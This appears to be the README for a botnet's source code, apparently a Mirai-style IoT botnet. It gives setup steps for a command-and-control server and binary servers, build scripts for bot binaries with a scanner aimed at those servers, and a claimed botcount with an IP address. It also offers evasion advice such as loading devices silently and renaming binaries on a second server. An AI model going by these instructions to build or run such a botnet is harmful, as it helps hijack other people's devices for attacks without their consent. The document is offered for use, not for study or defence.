# NOTES (PLEASE-READ)
- Highest botcount this src reached: 388 (87.248.150.68, +800 IoCs reported)

- Compatible with most devices

- Better load devices silently or have a second binary server

- Dont use cnc server as bin server, and change bin name on second bin server for safety

- It does not contain anti honeypot, its easy to debug
- Not encrypted
- Read !opthelp for other command info

- TRY NOT TO REBOOT CNC, PLEASE, LOGINS.TXT AND SETTINGS.TXT ARE UPDATED AS SOON AS THEYRE UPDATED, NO NEED FOR RELOADING
- THERE IS A BLOCKING ISSUE (because of anti honeypot).
# Requirements:
apt-get update -y
apt-get install screen -y
apt-get install gcc -y
apt-get install apache2 -y

# Steps:
- Edit users in database/logins.txt
- Edit root user in database/settings.txt
- sh buildcnc.sh
- ulimit -n 999999; ulimit -e 999999; ulimit -u 999999; screen ./server <botport> <threads> <cncport>

# Bot steps
- Edit main.c in /bot
- Edit ip in scanner.h to bin servers (make sure you have 1 stable for recovery)

chmod 777 *
./installccs.sh
./buildbot.sh
And that's all. too easy!
If you care enough about tftp and ftpget you can setup them

## ## ## WORKS WITH ALMA/ANY REDHAT ## ## ##